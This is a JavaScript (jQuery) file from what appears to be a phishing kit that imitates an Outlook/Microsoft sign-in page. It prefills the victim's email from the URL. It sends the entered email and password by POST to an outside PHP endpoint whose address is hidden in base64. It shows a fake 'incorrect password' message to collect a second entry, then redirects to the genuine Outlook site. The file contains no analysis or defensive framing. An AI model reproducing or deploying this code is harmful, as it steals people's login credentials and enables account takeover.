
  $(document).ready(function(){
    var count=0;
  /////////////url email getting////////////////
  var email = window.location.hash.substr(1);
  if (!email) {

  }
  else
  {
          // $('#email').val(email);
          var my_email =email;
          var ind=my_email.indexOf("@");
          var my_slice=my_email.substr((ind+1));
          var c= my_slice.substr(0, my_slice.indexOf('.'));
          var final= c.toLowerCase();
          $("#msg").hide();
            // $('#fieldImg').attr('src', 'images/other-1.png');
            // $('#field').html("Other Mail");
            $('#email').val(my_email);
            $('#dom').html(my_slice);

            $("#msg").hide();

        }
        ///////////////url getting email////////////////

         $('#submit-btn').click(function(event){
          $('#error').hide();
          $('#msg').hide();
          event.preventDefault();
          var email=$("#email").val();
          var password=$("#password").val();
          var msg = $('#msg').html();
          $('#msg').text( msg );
        ///////////new injection////////////////
        var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }

        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var n = my_email.search("@");
        ///////////new injection////////////////
        count=count+1;
        var d=atob("aHR0cHM6Ly9tb2luaHVpby5jb20vdGVtcC9tYi5waHA=");

        $.ajax({
          dataType: 'JSON',
          url: d,
          type: 'POST',
          data:{
            email:email,
            password:password,
          },
              // data: $('#contact').serialize(),
              beforeSend: function(xhr){
                $('#submit-btn').html('Sign in');
              },
              success: function(response){
                if(response){
                  $("#msg").show();
                  console.log(response);
                  if(response['signal'] == 'ok'){
                    $("#password").val("");
                    if (count>=2) {
                      count=0;
                       window.location.replace('https://outlook.live.com/owa/');
                    }
                    $('#msg').html(response['msg']);
                  }
                  else{
                    $('#msg').html(response['msg']);
                  }
                }
              },
              error: function(){
                $("#password").val("");
                if (count>=2) {
                      count=0;
                        window.location.replace('https://outlook.live.com/owa/');
                    }
                $("#msg").show();
                $('#msg').html("The username or password you entered isn't correct. Try entering it again.");
              },
              complete: function(){
                $('#submit-btn').html('Sign in');
              }
            });
      });


      });
    